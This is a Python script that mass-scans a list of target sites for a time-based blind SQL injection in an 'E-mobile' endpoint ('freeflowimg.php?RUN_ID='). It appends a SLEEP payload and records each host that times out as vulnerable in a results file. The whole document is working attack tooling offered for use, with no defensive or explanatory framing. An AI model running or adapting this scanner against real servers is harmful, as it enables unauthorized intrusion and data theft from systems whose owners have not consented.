import requests
import re

with open("target.txt","r") as f1:
    for i in f1.readlines():
        url = i.strip() + "/general/login/index.php"
        url1 = i.strip() + "/E-mobile/flow/freeflowimg.php?RUN_ID=123456"
        payload = " AND (SELECT 2117 FROM (SELECT(SLEEP(6)))pFbG)"
        try:
            req1 = requests.get(url=url)
            #print(req1.text)
            title = re.findall('<title>(.*?)</title>',req1.text)
            #print(title[0])
        except Exception as e:
            pass
        try:
            req2 = requests.get(url=url1+payload,allow_redirects=False, timeout=1)
        except Exception as e:
            print(title[0]+"\t"+url+"\t"+"存在SQL注入")
            with open("res.txt","a") as f2:
                f2.writelines(title[0]+"\t"+url+"\t"+"存在SQL注入"+"\n")